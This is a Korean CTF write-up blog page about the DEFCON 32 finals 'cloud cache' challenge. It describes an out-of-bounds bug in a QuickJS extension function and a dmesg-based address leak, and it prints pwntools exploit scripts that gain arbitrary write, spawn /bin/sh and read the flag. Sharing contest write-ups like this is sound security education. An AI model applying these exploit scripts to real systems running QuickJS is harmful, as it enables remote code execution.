<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>DEFCON 32 | msh1307</title>
<meta name="keywords" content="DEFCON CTF">
<meta name="description" content="컨퍼런스 티켓도 구매했었는데 대회랑 겹쳐서 전날에 구경밖에 못했다.
숙소 1층에서 DEFCON 셔틀이 있어서 그거 타고 라스베가스 컨벤션 센터로 갈 수 있었다.
1, 2일차에는 여러 문제들 보면서 잡다한 버그들 찾다가 상대팀 패치도 분석해보고 공격 패킷도 분석하면서 시간을 보냈다.
2일차에 마지막으로 release된 Attack &amp; Defense 문제중에 cloud cache를 잡았다.
그날 저녁 열심히 익스플로잇 코드 두 개를 준비해서 갔지만 막상 3일차에 본선장에 가서 다른 팀들한테 쏴봤더니 둘다 동작하지 않아서 당황했다.
원래 계획과는 다르게 팀원분이 다른 취약점으로 준비하신 두 개의 익스플로잇 코드를 먼저 쏘셨다.">
<meta name="author" content="">
<link rel="canonical" href="https://msh1307.kr/blog/defcon_32_cloud_cache-quickjs_exploitation/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
    onload="hljs.initHighlightingOnLoad();"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
<script>
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-BR89V2WEC0');
</script>
<link rel="icon" href="https://msh1307.kr/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="DEFCON 32" />
<meta property="og:description" content="컨퍼런스 티켓도 구매했었는데 대회랑 겹쳐서 전날에 구경밖에 못했다.
숙소 1층에서 DEFCON 셔틀이 있어서 그거 타고 라스베가스 컨벤션 센터로 갈 수 있었다.
1, 2일차에는 여러 문제들 보면서 잡다한 버그들 찾다가 상대팀 패치도 분석해보고 공격 패킷도 분석하면서 시간을 보냈다.
2일차에 마지막으로 release된 Attack &amp; Defense 문제중에 cloud cache를 잡았다.
그날 저녁 열심히 익스플로잇 코드 두 개를 준비해서 갔지만 막상 3일차에 본선장에 가서 다른 팀들한테 쏴봤더니 둘다 동작하지 않아서 당황했다.
원래 계획과는 다르게 팀원분이 다른 취약점으로 준비하신 두 개의 익스플로잇 코드를 먼저 쏘셨다." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://msh1307.kr/blog/defcon_32_cloud_cache-quickjs_exploitation/" /><meta property="article:section" content="blog" />
<meta property="article:published_time" content="2024-08-15T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2024-08-15T00:00:00&#43;00:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="DEFCON 32"/>
<meta name="twitter:description" content="컨퍼런스 티켓도 구매했었는데 대회랑 겹쳐서 전날에 구경밖에 못했다.
숙소 1층에서 DEFCON 셔틀이 있어서 그거 타고 라스베가스 컨벤션 센터로 갈 수 있었다.
1, 2일차에는 여러 문제들 보면서 잡다한 버그들 찾다가 상대팀 패치도 분석해보고 공격 패킷도 분석하면서 시간을 보냈다.
2일차에 마지막으로 release된 Attack &amp; Defense 문제중에 cloud cache를 잡았다.
그날 저녁 열심히 익스플로잇 코드 두 개를 준비해서 갔지만 막상 3일차에 본선장에 가서 다른 팀들한테 쏴봤더니 둘다 동작하지 않아서 당황했다.
원래 계획과는 다르게 팀원분이 다른 취약점으로 준비하신 두 개의 익스플로잇 코드를 먼저 쏘셨다."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Blogs",
      "item": "https://msh1307.kr/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "DEFCON 32",
      "item": "https://msh1307.kr/blog/defcon_32_cloud_cache-quickjs_exploitation/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "DEFCON 32",
  "name": "DEFCON 32",
  "description": "컨퍼런스 티켓도 구매했었는데 대회랑 겹쳐서 전날에 구경밖에 못했다.\n숙소 1층에서 DEFCON 셔틀이 있어서 그거 타고 라스베가스 컨벤션 센터로 갈 수 있었다.\n1, 2일차에는 여러 문제들 보면서 잡다한 버그들 찾다가 상대팀 패치도 분석해보고 공격 패킷도 분석하면서 시간을 보냈다.\n2일차에 마지막으로 release된 Attack \u0026amp; Defense 문제중에 cloud cache를 잡았다.\n그날 저녁 열심히 익스플로잇 코드 두 개를 준비해서 갔지만 막상 3일차에 본선장에 가서 다른 팀들한테 쏴봤더니 둘다 동작하지 않아서 당황했다.\n원래 계획과는 다르게 팀원분이 다른 취약점으로 준비하신 두 개의 익스플로잇 코드를 먼저 쏘셨다.",
  "keywords": [
    "DEFCON CTF"
  ],
  "articleBody": " 컨퍼런스 티켓도 구매했었는데 대회랑 겹쳐서 전날에 구경밖에 못했다.\n숙소 1층에서 DEFCON 셔틀이 있어서 그거 타고 라스베가스 컨벤션 센터로 갈 수 있었다.\n1, 2일차에는 여러 문제들 보면서 잡다한 버그들 찾다가 상대팀 패치도 분석해보고 공격 패킷도 분석하면서 시간을 보냈다.\n2일차에 마지막으로 release된 Attack \u0026 Defense 문제중에 cloud cache를 잡았다.\n그날 저녁 열심히 익스플로잇 코드 두 개를 준비해서 갔지만 막상 3일차에 본선장에 가서 다른 팀들한테 쏴봤더니 둘다 동작하지 않아서 당황했다.\n원래 계획과는 다르게 팀원분이 다른 취약점으로 준비하신 두 개의 익스플로잇 코드를 먼저 쏘셨다.\n이대로 쪽박치는줄 알았지만 코드 수정에 성공해서 많은 팀들을 때릴 수 있었다.\nexploit을 원래 자동으로 날려주는 툴이 있었는데 rate limit이 걸려있어서 사용하지 못했다.\n그래서 그때부터 대회 끝날때까지 라운드마다 직접 손으로 쐈다.\n첫 라운드엔 MMM 플래그도 따였었는데, 패치가 지연되어서 늦게 올라갔던건지 얼마 지나지 않아 패치되었다.\nMMM 분들이 패치하자마자 일부 팀들이 백도어 위험을 감수하고 패치를 그대로 적용해버려서 대회 끝날때쯤엔 두 팀 정도를 제외하고 모두 패치되었다.\ncloud cache 유저랜드 프로그램은 quickjs 프롬프트가 나오는 방식이고 커널 드라이버가 로드되어서 같이 상호작용한다.\n로컬에서 돌리려고 쌩쇼를 하고 있었는데 팀원분이 유저 프로그램에서 oob를 찾아주셨다.\n그래서 oob를 통해 dos를 내고 dmesg를 조합하면 뭔가 익스를 할 수 있을것 같았다.\n커널쪽 취약점도 따로 있었다고 하는데 그 부분은 다른 팀원분이 익스를 해주셨다.\nexploit with dmesg oob dos + dmesg를 조합해서 릭을 했다.\nsign extension은 안되고 -1 같은 경우 0xffffffff로 계산되기에 다음 코드는 항상 dos가 난다.\np.sendline('let a = [1.1]; jsExpand(a, -1); a[-3] = 0xdeadbeef') 그리고 js_expand 함수 내부에서 JS_ToInt32로 두번째 인자는 검사를 하는데 첫번째 인자를 검사하지 않아 실질적으로 double을 인자로 주면 이게 주소로 인식이 된다.\n... else if ( (JS_ToInt32)(ctx, \u0026new_len, argv[1].u.ptr, argv[1].tag) ) { return 0LL; } else { v5 = new_len; v6 = *(argv-\u003eu.ptr + 4); *(argv-\u003eu.ptr + 8) = new_len; result = v5; *v6 = v5; } return result; } 그래서 js_expand 함수 내부 로직을 통해 4 byte aaw가 가능해진다.\n그런데 실질적으로 쓰기 연산 자체는 8 byte 단위여서 다른 방법을 찾기로 했다.\n# double array # element ptr | length # heap chunk size | element 1 | element 2 ... # --- normal oob array --- # contraints : 0x10 aligned \u0026 oob 8bytes + type data p.sendline('let a = [1.1]; jsExpand(a, -1); a[-3] = 0xdeadbeef') 이런식으로 일반 array를 쓰면 내부적으로 64bit value | type data 가 포함된 형태로 저장되었다.\n그래서 실질적으로 0x10 aligned 된 쓰기만 가능했다.\n읽기를 할때도 항상 tag 검사가 있어서 실질적으로 oob leak이 불가능했다.\ndmesg로 quickjs.so의 base를 구할 수 있었다.\n어떻게 array를 배치해도 메모리 상에서 +0x8 위치에 있는 element pointer를 덮을 수 없었다.\n그러다가 Float64Array 같은 type이 지정된 array를 만들면 type 정보가 생략된다는 것을 알았다.\nfrom pwn import * import base64 context.log_level='debug' def exploit(ip: str, port: int) -\u003e str | None: r_info = remote(ip, port) r_info.recvline() r_info.recvuntil('telnet ') ip, port = r_info.recvline()[:-1].split() port = int(port) p = remote(ip, port) p.sendline('a = [1.1, 2.2]; jsExpand(a, -1); a[-3] = 0xdeadbeef') p.close() p = remote(ip, port) p.sendline('dmesg()') while True: if p.recvuntil(b'Code: ', timeout=1.5) == b'': break msg = p.recvuntil(b'undefined') quickjs_base = int(msg[msg.find(b'RAX:'):].split()[1],16) - 0x21078 log.success(hex(quickjs_base)) libc_base = quickjs_base - 0x229000# - 0x23b000 # local offset log.success(hex(libc_base)) libc_got = libc_base + 0x21a098 global_ctx = int(msg[msg.find(b'RDI:'):].split()[1],16) log.success(hex(global_ctx)) heap = int(msg[msg.find(b'RSI:'):].split()[1],16) target = heap + 0x1bf0 log.success(hex(target)) p.close() p = remote(ip, port) p.sendline('let memory = new ArrayBuffer(8); let view_u32 = new Uint32Array(memory); let view_f64 = new Float64Array(memory); let view_u8 = new Uint8Array(memory); function i64_to_f64(low, high) {view_u32[0] = low; view_u32[1] = high; return view_f64[0];};') sleep(0.5) p.sendline('let a = new Float64Array(4); a[0] = 1.1; a[1] = 2.2; a[2] = 3.3; jsExpand(a, -1);') sleep(0.5) p.sendline(f'let b = new Float64Array(4); b[0] = 1.1; b[1] = 2.2; b[2] = 3.3; jsExpand(b, -1); b[13] = i64_to_f64({(libc_got)\u00260xffffffff}, {libc_got \u003e\u003e 32}); b[0] = i64_to_f64({(libc_base + 0x50d70)\u00260xffffffff}, {libc_base \u003e\u003e 32}); \"/bin/sh\";') sleep(0.5) p.recvuntil(b'undefined') p.recvuntil(b'-1') p.recvuntil(b'\\xfb') p.sendline('cat /fla? | base64') flag = base64.b64decode(p.recvline()[:-1]).decode() return flag print(exploit('localhost', 9999)) 하지만 위 방식의 익스플로잇 코드는 로컬 환경에선 동작했지만 대회장에 가서는 동작하지 않았다.\n두 번째 익스플로잇처럼 수정했다면 동작했을 수 있었겠지만, 익스플로잇 수정이 완료되었을 시간엔 거의 패치가 완료되었을 것이라 생각했기에 바로 두번째 익스플로잇을 이용했다.\nexploit without dmesg 첫 번째 익스플로잇을 짜다가 발견했던 type 정보 생략을 이용해서 메모리 릭도 자체적으로 수행할 수 있을 것이라고 생각했다.\nfunction을 정의해서 할당 관련 함수를 힙에 남기고 이를 릭해서 quickjs.so의 base를 얻을 수 있었다.\n대회장에선 동작을 안해서 좀 더 안정적으로 만들기 위해 element pointer를 quickjs.so의 got로 변조해서 libc의 base를 얻도록 수정했다.\nfrom pwn import * import base64 import struct def exploit(ip: str, port: int) -\u003e str | None: # r_info = remote(ip, port) # r_info.recvline() # r_info.recvuntil('telnet ') # ip, port = r_info.recvline()[:-1].split() # port = int(port) p = remote(ip, port) sleep(3) p.sendline('let memory = new ArrayBuffer(8); let view_u32 = new Uint32Array(memory); let view_f64 = new Float64Array(memory); let view_u8 = new Uint8Array(memory);') sleep(0.5) p.sendline('let a = new Float64Array(4); a[0] = 1.1; a[1] = 2.2; a[2] = 3.3; jsExpand(a, -1);') sleep(0.5) p.sendline(f'let b = new Float64Array(4); b[0] = 1.1; b[1] = 2.2; b[2] = 3.3; jsExpand(b, -1); console.log(\"lk:\"+b[13]);') p.recvuntil(b'lk:') lk = float(p.recvline()[:-1]) object_elemnt_ptr = struct.unpack('",
  "wordCount" : "1113",
  "inLanguage": "en",
  "datePublished": "2024-08-15T00:00:00Z",
  "dateModified": "2024-08-15T00:00:00Z",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://msh1307.kr/blog/defcon_32_cloud_cache-quickjs_exploitation/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "msh1307",
    "logo": {
      "@type": "ImageObject",
      "url": "https://msh1307.kr/favicon.ico"
    }
  }
}
</script>
</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>

<header class="header sticky-header">
    
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
    <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'G-BR89V2WEC0');
    </script>
    <nav class="nav">
        <div class="logo">
            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://msh1307.kr/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/blog" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/about" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/categories" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://msh1307.kr/tags" title="Tags">
                    <span>Tags</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
    <h1 class="post-title">
      DEFCON 32
    </h1>
    <div class="post-meta">


October 2024

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">‎ Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#cloud-cache" aria-label="cloud cache">cloud cache</a><ul>
                        
                <li>
                    <a href="#exploit-with-dmesg" aria-label="exploit with dmesg">exploit with dmesg</a></li>
                <li>
                    <a href="#exploit-without-dmesg" aria-label="exploit without dmesg">exploit without dmesg</a>
                </li>
            </ul>
            </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><p><img loading="lazy" src="/blog/DEFCON_32_cloud_cache-Quickjs_exploitation/4779bf4917b80cd4eeccc66c064b8c41.jpg" alt=""  />
<br>
컨퍼런스 티켓도 구매했었는데 대회랑 겹쳐서 전날에 구경밖에 못했다.<br>
<img loading="lazy" src="/blog/DEFCON_32_cloud_cache-Quickjs_exploitation/1c63c55b3cc3452d5a4dd47bd1d7752d.jpg" alt=""  />
<br>
숙소 1층에서 DEFCON 셔틀이 있어서 그거 타고 라스베가스 컨벤션 센터로 갈 수 있었다.<br>
1, 2일차에는 여러 문제들 보면서 잡다한 버그들 찾다가 상대팀 패치도 분석해보고 공격 패킷도 분석하면서 시간을 보냈다.<br>
2일차에 마지막으로 release된 Attack &amp; Defense 문제중에 cloud cache를 잡았다.</p>
<p>그날 저녁 열심히 익스플로잇 코드 두 개를 준비해서 갔지만 막상 3일차에 본선장에 가서 다른 팀들한테 쏴봤더니 둘다 동작하지 않아서 당황했다.<br>
원래 계획과는 다르게 팀원분이 다른 취약점으로 준비하신 두 개의 익스플로잇 코드를 먼저 쏘셨다.<br>
이대로 쪽박치는줄 알았지만 코드 수정에 성공해서 많은 팀들을 때릴 수 있었다.<br>
exploit을 원래 자동으로 날려주는 툴이 있었는데 rate limit이 걸려있어서 사용하지 못했다.<br>
그래서 그때부터 대회 끝날때까지 라운드마다 직접 손으로 쐈다.<br>
첫 라운드엔 MMM 플래그도 따였었는데, 패치가 지연되어서 늦게 올라갔던건지 얼마 지나지 않아 패치되었다.<br>
MMM 분들이 패치하자마자 일부 팀들이 백도어 위험을 감수하고 패치를 그대로 적용해버려서 대회 끝날때쯤엔 두 팀 정도를 제외하고 모두 패치되었다.</p>
<h1 id="cloud-cache">cloud cache<a hidden class="anchor" aria-hidden="true" href="#cloud-cache">#</a></h1>
<p>유저랜드 프로그램은 quickjs 프롬프트가 나오는 방식이고 커널 드라이버가 로드되어서 같이 상호작용한다.<br>
로컬에서 돌리려고 쌩쇼를 하고 있었는데 팀원분이 유저 프로그램에서 oob를 찾아주셨다.<br>
그래서 oob를 통해 dos를 내고 dmesg를 조합하면 뭔가 익스를 할 수 있을것 같았다.<br>
커널쪽 취약점도 따로 있었다고 하는데 그 부분은 다른 팀원분이 익스를 해주셨다.</p>
<h2 id="exploit-with-dmesg">exploit with dmesg<a hidden class="anchor" aria-hidden="true" href="#exploit-with-dmesg">#</a></h2>
<p>oob dos + dmesg를 조합해서 릭을 했다.<br>
sign extension은 안되고 -1 같은 경우 0xffffffff로 계산되기에 다음 코드는 항상 dos가 난다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>p.<span style="color:#a6e22e">sendline</span>(<span style="color:#960050;background-color:#1e0010">&#39;</span>let a <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>]; <span style="color:#a6e22e">jsExpand</span>(a, <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>); a[<span style="color:#f92672">-</span><span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xdeadbeef</span><span style="color:#960050;background-color:#1e0010">&#39;</span>)
</span></span></code></pre></div><p>그리고 js_expand 함수 내부에서 JS_ToInt32로 두번째 인자는 검사를 하는데 첫번째 인자를 검사하지 않아 실질적으로 double을 인자로 주면 이게 주소로 인식이 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>   ...
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( (JS_ToInt32)(ctx, <span style="color:#f92672">&amp;</span>new_len, argv[<span style="color:#ae81ff">1</span>].u.ptr, argv[<span style="color:#ae81ff">1</span>].tag) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0LL</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> new_len;
</span></span><span style="display:flex;"><span>    v6 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(argv<span style="color:#f92672">-&gt;</span>u.ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(argv<span style="color:#f92672">-&gt;</span>u.ptr <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>) <span style="color:#f92672">=</span> new_len;
</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> v5;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>v6 <span style="color:#f92672">=</span> v5;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>그래서 js_expand 함수 내부 로직을 통해 4 byte aaw가 가능해진다.<br>
그런데 실질적으로 쓰기 연산 자체는 8 byte 단위여서 다른 방법을 찾기로 했다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># double array </span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># element ptr | length</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># heap chunk size | element 1 | element 2 ...</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># --- normal oob array ---</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># contraints : 0x10 aligned &amp; oob 8bytes + type data</span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let a = [1.1]; jsExpand(a, -1); a[-3] = 0xdeadbeef&#39;</span>)
</span></span></code></pre></div><p>이런식으로 일반 array를 쓰면 내부적으로 64bit value | type data 가 포함된 형태로 저장되었다.<br>
그래서 실질적으로 0x10 aligned 된 쓰기만 가능했다.<br>
읽기를 할때도 항상 tag 검사가 있어서 실질적으로 oob leak이 불가능했다.<br>
dmesg로 quickjs.so의 base를 구할 수 있었다.<br>
어떻게 array를 배치해도 메모리 상에서 +0x8 위치에 있는 element pointer를 덮을 수 없었다.</p>
<p>그러다가 Float64Array 같은 type이 지정된 array를 만들면 type 정보가 생략된다는 것을 알았다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(ip: str, port: int) <span style="color:#f92672">-&gt;</span> str <span style="color:#f92672">|</span> <span style="color:#66d9ef">None</span>:
</span></span><span style="display:flex;"><span>    r_info <span style="color:#f92672">=</span> remote(ip, port)
</span></span><span style="display:flex;"><span>    r_info<span style="color:#f92672">.</span>recvline()
</span></span><span style="display:flex;"><span>    r_info<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;telnet &#39;</span>)
</span></span><span style="display:flex;"><span>    ip, port <span style="color:#f92672">=</span> r_info<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split()
</span></span><span style="display:flex;"><span>    port <span style="color:#f92672">=</span> int(port)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;a = [1.1, 2.2]; jsExpand(a, -1); a[-3] = 0xdeadbeef&#39;</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;dmesg()&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Code: &#39;</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">1.5</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    msg <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;undefined&#39;</span>)
</span></span><span style="display:flex;"><span>    quickjs_base <span style="color:#f92672">=</span> int(msg[msg<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;RAX:&#39;</span>):]<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x21078</span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(hex(quickjs_base))
</span></span><span style="display:flex;"><span>    libc_base <span style="color:#f92672">=</span> quickjs_base <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x229000</span><span style="color:#75715e"># - 0x23b000 # local offset</span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(hex(libc_base))
</span></span><span style="display:flex;"><span>    libc_got <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x21a098</span>
</span></span><span style="display:flex;"><span>    global_ctx <span style="color:#f92672">=</span> int(msg[msg<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;RDI:&#39;</span>):]<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(hex(global_ctx))
</span></span><span style="display:flex;"><span>    heap <span style="color:#f92672">=</span> int(msg[msg<span style="color:#f92672">.</span>find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;RSI:&#39;</span>):]<span style="color:#f92672">.</span>split()[<span style="color:#ae81ff">1</span>],<span style="color:#ae81ff">16</span>)
</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> heap <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x1bf0</span>
</span></span><span style="display:flex;"><span>    log<span style="color:#f92672">.</span>success(hex(target))
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> remote(ip, port)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let memory = new ArrayBuffer(8); let view_u32 = new Uint32Array(memory); let view_f64 = new Float64Array(memory); let view_u8 = new Uint8Array(memory); function i64_to_f64(low, high) {view_u32[0] = low; view_u32[1] = high; return view_f64[0];};&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;let a = new Float64Array(4); a[0] = 1.1; a[1] = 2.2; a[2] = 3.3; jsExpand(a, -1);&#39;</span>)
</span></span><span style="display:flex;"><span>    sleep(<span style="color:#ae81ff">0.5</span>)
